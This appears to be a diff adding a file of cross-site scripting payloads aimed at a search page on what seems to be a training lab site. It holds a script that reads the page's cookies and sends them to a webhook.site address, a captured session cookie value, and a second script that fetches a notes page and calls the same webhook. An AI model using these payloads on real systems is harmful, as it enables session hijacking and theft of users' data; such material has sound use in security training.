@@ -1,0 +1,12 @@
+https://note1.cyberjutsu-lab.tech/search?q=
+<script>
+data_leak = document.cookie;
+anh = new Image();
+URL_LEAK = "https://webhook.site/f4c73293-5aef-4485-9b70-a05c9872ac99?leak=";
+anh.src = URL_LEAK%2Bdata_leak;
+</script>
+
+connect.sid=s:Qm4A5KjB1wmj6ci8MgWrmepkG6Z21M4c.H67b7YyklpXcw1Gf+h7BY3urfLVfzdMSn9Roy/R/6Uw
+
+<script>fetch("/note").then(function(response){ return response.text()
+}).then(function(response){ fetch('https://webhook.site/f4c73293-5aef-4485-9b70-a05c9872ac99?note='+encodeURI('s:Qm4A5KjB1wmj6ci8MgWrmepkG6Z21M4c.H67b7YyklpXcw1Gf+h7BY3urfLVfzdMSn9Roy/R/6Uw')) });</script>
